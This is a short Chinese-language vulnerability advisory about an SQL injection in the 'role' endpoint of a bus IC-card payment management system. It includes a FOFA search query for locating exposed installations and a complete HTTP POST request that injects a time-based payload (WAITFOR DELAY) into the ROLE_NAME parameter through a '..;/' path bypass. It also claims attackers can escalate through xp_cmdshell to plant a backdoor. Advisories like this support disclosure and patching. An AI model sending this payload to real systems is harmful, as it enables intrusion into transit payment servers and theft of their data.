# 公交IC卡收单管理系统role存在SQL注入漏洞

# 一、漏洞简介
公交IC卡收单管理系统是城市公共交通领域中不可或缺的一部分，它通过集成先进的集成电路技术（IC卡）实现了乘客便捷的支付方式，并有效提高了公共交通运营效率。系统集成了发卡、充值、消费、数据采集、查询和注销等多个功能模块，为公交公司和乘客提供了全面、高效、便捷的公共交通支付解决方案。该系统不仅提升了乘客的出行体验，还降低了公交公司的运营成本，提高了管理效率。公交IC卡收单管理系统 role存在SQL注入漏洞。经过身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。

# 二、影响版本
+ 公交IC卡收单管理系统

# 三、资产测绘
+ fofa`app="公交IC卡收单管理系统"`
+ 特征

![1727274040056-105b772f-bf3b-4e57-bb11-3f4c308b04c5.png](./img/dyW3C6ThOGt0sRum/1727274040056-105b772f-bf3b-4e57-bb11-3f4c308b04c5-157372.png)

# 四、漏洞复现
```java
POST /assets/..;/role HTTP/1.1
Host: 
Accept: application/json, text/javascript, */*; q=0.01
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:130.0) Gecko/20100101 Firefox/130.0
Accept-Encoding: gzip, deflate
Cookie: JSESSIONID=BE20D06711487C9D6D5325C1129F244C
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
 
_search=false&nd=1727245571646&rowCountPerPage=10&pageNo=1&sidx=ROLE_NAME&sord=asc&method=select&ROLE_NAME=1');WAITFOR DELAY '0:0:5'--
```

![1727274105161-0d35d76a-8101-4198-9b0a-9606dbc0777f.png](./img/dyW3C6ThOGt0sRum/1727274105161-0d35d76a-8101-4198-9b0a-9606dbc0777f-800904.png)



> 更新: 2024-10-22 09:36:09  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lntxyx716eea8fw2>